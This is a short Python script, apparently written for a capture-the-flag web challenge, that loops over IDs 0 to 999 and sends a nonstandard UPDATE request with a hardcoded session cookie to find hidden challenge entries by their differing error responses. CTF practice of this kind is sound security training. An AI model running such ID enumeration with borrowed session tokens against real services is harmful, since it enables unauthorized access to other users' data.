#!/usr/bin/env python3
import requests
url = 'http://challs.dvc.tf:5001/'
#proxies = {'http':'http://127.0.0.1:8080'}
def find_next_challenge(id):
  errors=['Challenge not found']
  try:
    r=requests.request('UPDATE',url,json={'number':'50','id':str(id)} ,cookies={'session':'eyJ1c2VybmFtZSI6InJ5bjAifQ.YiwRhQ.OcJ8wF5_G8w5T0M5MIKIwXxzKMw'})
    if r.status_code == 400:
      res = r.json()['error']
      if res not in errors:
        print(f'diff error at : {id}')
    else:
      print(f'Something diff at : {id}')
  except Exception as e:
    print(e)

if __name__ == '__main__':
  for i in range(0,1000):
    find_next_challenge(i)

